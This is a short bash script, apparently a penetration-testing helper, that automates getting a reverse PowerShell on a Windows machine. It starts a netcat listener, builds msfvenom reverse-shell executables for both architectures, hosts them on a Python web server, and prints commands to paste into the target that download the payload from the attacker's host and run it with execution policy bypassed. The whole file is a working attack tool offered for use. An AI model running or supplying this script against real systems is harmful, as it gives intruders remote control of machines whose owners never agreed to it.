#Created by github.com/vikrantrana1996
#Email: dukevikrant AT gmail DOT com
#Feel free to submit changes
GREEN='\033[0;32m'
NOCOLOR='\033[0m'
echo 'Enter remote windows type (32/64)'
read OS
echo 'Enter LHOST (Local IP)'
read LHOST
echo Going to listen on PORT 61105...
echo Creating tmux session power1
tmux new-session -d -s power1 'nc -lvnp 61105'
cd venom_binaries
echo Generating msfvenom binaries for both archs...
msfvenom -p windows/x64/powershell_reverse_tcp lhost=$LHOST lport=61105 -f exe --platform windows > reverse64.exe
msfvenom -p windows/powershell_reverse_tcp lhost=$LHOST lport=61105 -f exe --platform windows > reverse32.exe
echo Hosting msfvenom generated binaries through python server on 8001...
tmux new-session -d -s pythonserver8001 'python -mSimpleHTTPServer 8001'
echo
echo
echo -e ${GREEN}Paste the following in your remote windows shell...${NOCOLOR}
echo 'mkdir c:\ourdumps
echo $storageDir = "c:\ourdumps" > c:\ourdumps\wget2.ps1
echo $webclient = New-Object System.Net.WebClient >> c:\ourdumps\wget2.ps1
echo $url = "http://'$LHOST':8001/reverse'$OS'.exe" >> c:\ourdumps\wget2.ps1
echo $file = "c:\ourdumps\reverse.exe" >> c:\ourdumps\wget2.ps1
echo $webclient.DownloadFile($url,$file) >> c:\ourdumps\wget2.ps1
echo Start-Job { C:\ourdumps\reverse.exe } >> c:\ourdumps\wget2.ps1
echo Start-Sleep -s 100000 >> c:\ourdumps\wget2.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File c:\ourdumps\wget2.ps1'
echo
echo
echo -e ${GREEN}Access your reverse powershell tmux session using...${NOCOLOR}
echo tmux a -t power1
